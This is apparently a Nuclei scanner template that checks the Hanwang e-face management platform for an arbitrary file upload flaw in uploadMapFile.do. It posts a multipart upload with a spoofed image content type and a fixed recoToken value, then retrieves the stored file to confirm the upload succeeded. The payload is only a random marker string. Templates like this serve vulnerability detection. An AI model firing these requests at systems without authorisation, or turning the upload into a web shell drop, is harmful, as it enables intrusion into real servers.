id: hanwang-uploadMapFile-upload-2

info:
  name: 汉王e脸通综合管理平台 uploadMapFile.do 任意文件上传漏洞
  author: hanwang
  severity: high
  tags: hanwang

http:
  - raw:
      - |
        POST /manage/visitorMapConfig/uploadMapFile.do?recoToken=67mds2pxXQb HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="1dd56sf.txt"
        Content-Type: image/jpeg
        
        {{randstr_1}}
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--

      - |+
        GET /manage/resource/{{path1}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    extractors:
      - type: regex
        part: body
        name: path1
        regex:
          - '"path":"(.*?\.txt)"'
        internal: true
        group: 1

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_2
        words:
          - '{{randstr_1}}'
    matchers-condition: and
